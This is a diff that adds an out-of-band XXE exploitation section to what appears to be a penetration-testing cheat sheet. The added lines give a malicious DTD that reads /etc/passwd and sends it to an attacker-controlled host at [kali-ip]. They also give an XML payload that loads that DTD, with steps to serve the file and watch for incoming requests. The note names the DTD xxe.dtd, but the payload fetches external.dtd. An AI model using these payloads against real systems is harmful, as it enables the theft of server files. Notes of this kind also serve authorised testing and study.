@@ -63,6 +63,27 @@ wfuzz -w paths.txt -w files.txt --hh 0 "$URL/index.php?id=FUZZFUZ2Z"
 ### Fuzzing XXE 
 Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuzzing/XXE-Fuzzing.txt`
 
+### Out-of-Band Exploitation
+1. Create file named xxe.dtd with content:
+```xml
+<!ENTITY % content SYSTEM "file:///etc/passwd">
+<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://[kali-ip]/out?%content;'>" >
+```
+2. Serve file with http 
+3. Insert file in payload 
+```xml
+<!DOCTYPE oob [
+<!ENTITY % base SYSTEM "http://[kali-ip]/external.dtd"> 
+%base;
+%external;
+%exfil;
+]>
+```
+4. Check incoming requests 
+
+Note that extracting file with multiple lines may not work due to encoding issues. 
+
+
 ## Server-side Template Injection 
 
 ### Fuzzing SSTI 
